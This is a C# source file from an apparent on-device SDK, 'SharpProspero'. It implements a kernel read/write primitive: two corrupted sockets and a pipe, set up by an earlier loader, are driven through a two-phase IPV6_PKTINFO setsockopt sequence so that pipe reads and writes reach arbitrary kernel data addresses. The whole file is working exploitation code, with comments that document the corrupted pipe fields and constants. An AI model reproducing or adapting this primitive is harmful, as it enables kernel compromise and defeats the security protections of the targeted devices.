// SharpProspero - a C# SDK for on-device application modules.
// Copyright (C) 2026 SvenGDK

using SharpProspero.Interop.Posix;

namespace SharpProspero.Payload;

/// <summary>
/// Reads and writes kernel memory through the pipe primitive the loader set up before launching the
/// payload. Two corrupted sockets redirect the pipe's internal buffer pointer to an arbitrary kernel
/// data address; a subsequent <c>read</c> or <c>write</c> on the pipe moves bytes at that address.
/// </summary>
/// <remarks>
/// <para>
/// Each operation makes four <c>setsockopt</c> calls (two per phase) using <c>IPV6_PKTINFO</c> and a
/// twenty-byte <c>in6_pktinfo</c> buffer. Phase one resets the pipe's control fields through the
/// first socket and configures the second socket's target. Phase two shifts the second socket's
/// target to the pipe's buffer-pointer field and writes the desired kernel address through it.
/// </para>
/// <para>
/// Only kernel data and heap addresses are reachable. Kernel text addresses cause the pipe's
/// page-fault path to wedge the calling thread; the caller must not pass them.
/// </para>
/// </remarks>
public readonly unsafe struct PayloadKernelIo
{
    private const int IpprotoIpv6 = 41;
    private const int Ipv6Pktinfo = 46;
    private const uint PktinfoLen = 20;

    /// <summary>Phase-one value for a read: sets pipe cnt to a large value so <c>read</c> succeeds.</summary>
    private const ulong ReadPhase1Addr = 0x40000000_40000000;

    /// <summary>Phase-one padding whose byte 15 (0x40) lands in the pipe's <c>size</c> field as 0x40000000.</summary>
    private const ulong Phase1Pad = 0x40000000_00000000;

    private readonly int _masterSock;
    private readonly int _victimSock;
    private readonly int _pipeRead;
    private readonly int _pipeWrite;
    private readonly ulong _overlapBase;

    /// <summary>Wraps the pipe primitive from the loader's argument block.</summary>
    public PayloadKernelIo(PayloadArgs* args)
    {
        _masterSock = args->RwPair[0];
        _victimSock = args->RwPair[1];
        _pipeRead = args->RwPipe[0];
        _pipeWrite = args->RwPipe[1];
        _overlapBase = args->KernelPipeAddress;
    }

    /// <summary>Reads an eight-byte value from a kernel data address.</summary>
    public ulong ReadU64(ulong kaddr)
    {
        ulong value;
        Redirect(kaddr, ReadPhase1Addr);
        PosixIo.read(_pipeRead, &value, 8);
        return value;
    }

    /// <summary>Reads a four-byte value from a kernel data address.</summary>
    public uint ReadU32(ulong kaddr)
    {
        uint value;
        Redirect(kaddr, ReadPhase1Addr);
        PosixIo.read(_pipeRead, &value, 4);
        return value;
    }

    /// <summary>Writes an eight-byte value to a kernel data address.</summary>
    public void WriteU64(ulong kaddr, ulong value)
    {
        Redirect(kaddr, 0);
        PosixIo.write(_pipeWrite, &value, 8);
    }

    /// <summary>Writes a four-byte value to a kernel data address.</summary>
    public void WriteU32(ulong kaddr, uint value)
    {
        Redirect(kaddr, 0);
        PosixIo.write(_pipeWrite, &value, 4);
    }

    /// <summary>Reads <paramref name="length"/> bytes from a kernel data address into a user buffer.</summary>
    public void Read(ulong kaddr, byte* buffer, int length)
    {
        Redirect(kaddr, ReadPhase1Addr);
        PosixIo.read(_pipeRead, buffer, (ulong)length);
    }

    /// <summary>Writes <paramref name="length"/> bytes from a user buffer to a kernel data address.</summary>
    public void Write(ulong kaddr, byte* buffer, int length)
    {
        Redirect(kaddr, 0);
        PosixIo.write(_pipeWrite, buffer, (ulong)length);
    }

    /// <summary>
    /// Redirects the pipe's buffer pointer to <paramref name="kaddr"/> through the two-phase
    /// setsockopt sequence.
    /// </summary>
    private void Redirect(ulong kaddr, ulong phase1Addr)
    {
        byte* m = stackalloc byte[20];
        byte* v = stackalloc byte[20];

        *(ulong*)m = _overlapBase;
        *(ulong*)(m + 8) = 0;
        *(uint*)(m + 16) = 0;

        *(ulong*)v = phase1Addr;
        *(ulong*)(v + 8) = Phase1Pad;
        *(uint*)(v + 16) = 0;

        PosixSocket.setsockopt(_masterSock, IpprotoIpv6, Ipv6Pktinfo, m, PktinfoLen);
        PosixSocket.setsockopt(_victimSock, IpprotoIpv6, Ipv6Pktinfo, v, PktinfoLen);

        *(ulong*)m = _overlapBase + 0x10;
        PosixSocket.setsockopt(_masterSock, IpprotoIpv6, Ipv6Pktinfo, m, PktinfoLen);

        *(ulong*)v = kaddr;
        *(ulong*)(v + 8) = 0;
        PosixSocket.setsockopt(_victimSock, IpprotoIpv6, Ipv6Pktinfo, v, PktinfoLen);
    }
}
